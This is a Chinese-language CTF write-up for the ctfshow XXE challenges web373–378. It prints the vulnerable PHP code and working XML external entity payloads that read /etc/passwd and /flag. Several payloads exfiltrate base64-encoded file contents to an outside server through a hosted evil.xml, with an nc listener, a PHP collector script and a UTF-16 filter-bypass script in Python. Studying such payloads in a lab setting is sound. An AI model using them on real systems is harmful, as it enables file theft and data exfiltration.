@[toc]

## XEE漏洞的原理

[XML外部实体注入](https://xz.aliyun.com/t/6754)

##  ctfshow-xxe

###  web373

代码

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
//file_get_contents("php://input"),我们需要post我们的payload
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    //DOMDocument,表示整个HTML或XML文档;作为文档树的根。
    $dom = new DOMDocument();
    //loadXML,从一个字符串中，加载一个XML文档
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    //将XML文档作为一个导入一个XML对象
    $creds = simplexml_import_dom($dom);
    //XML对象指向ctfshow的元素标签
    $ctfshow = $creds->ctfshow;
    echo $ctfshow;
}
highlight_file(__FILE__);    
?>
```

所以我们就直接利用外部实体来构造payload

```XML
<!DOCTYPE root-element [
    <!ELEMENT root-element (#PCDATA)>
    <!ENTITY xee SYSTEM "file:///etc/passwd">
]>
<!--一定要包含ctfshow的元素-->
<root-element>
	<ctfshow>&xee;</ctfshow>
</root-element>
```

###  web374，375，376

其中376好像把xml的头过滤了，但是下面的payload没有用到xml头

代码

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);  
```

看代码，没有echo了，说明是XXE没有回显了，我们需要使用盲注

payload:

```xml
<?xml version='1.0'?>
<!DOCTYPE root-element [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % dtd SYSTEM "http://xxx/evil.xml">//xxx表示自己服务器的ip地址
%dtd;
%send;
]>
<root>123</root>
```

evil.xml,需要与路径匹配

```
<!ENTITY % payload "<!ENTITY &#x25; send  SYSTEM 'http://xxx:9999/%file;'> ">%payload;
//%号要进行实体编码成&#x25
```

我解释一下，传入的xml，ip地址是自己evil.xml放入的文件地址

evil.xml其中的xxx就是自己服务器的IP地址，端口随便（只要开放端口都可以）

然后服务器监听,nc -lvvp 9999

这是服务器监听拿flag，我们还可以使用php文件

payload

```
# pd.dtd
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM 'http://47.95.235.67/xxe.php?q=%file;'>"
>
%all;<?xml version='1.0'?>
<!DOCTYPE root-element [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % dtd SYSTEM "http://xxx/evil.xml">//xxx表示自己服务器的ip地址
%dtd;
%send;
]>
<root>123</root>
```

evil.xml

```
<!ENTITY % payload "<!ENTITY &#x25; send  SYSTEM 'http://xxx:9999/xxe.php?c=%file;'> ">%payload;
//%号要进行实体编码成&#x25
```

xxe.php

```php
# xxe.php
<?php
highlight_file(__FILE__);
$xxe = base64_decode($_GET['c']);
$txt = 'flag.txt';
file_put_contents($txt,$xxe,FILE_APPEND)
?>
```

###  web377

代码

```php
<?php
error_reporting(0);
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
if(preg_match('/<\?xml version="1\.0"|http/i', $xmlfile)){
    die('error');
}
if(isset($xmlfile)){
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
}
highlight_file(__FILE__);    

```

过滤了xml头和http关键字，xml头无所谓，http，我们可以使用utf-16来

直接使用脚本跑吧

```python
import requests

url = 'http://5d02e5f9-796d-4dc6-8e1e-6dbb51d6c0c0.challenge.ctf.show:8080/'
data = """<!DOCTYPE ANY [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % dtd SYSTEM "http://xxx/evil.xml">
%dtd;
%send;
] >"""

requests.post(url ,data=data.encode('utf-16'))
print("OK!")
```

###  web378

这道题，我们看到有回显，而且抓包发现post内容已经有xml的元素

所以，我们直接构造就行了

```
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///flag">
]>
<user><username>&xxe;</username><password>&xxe;</password>
```

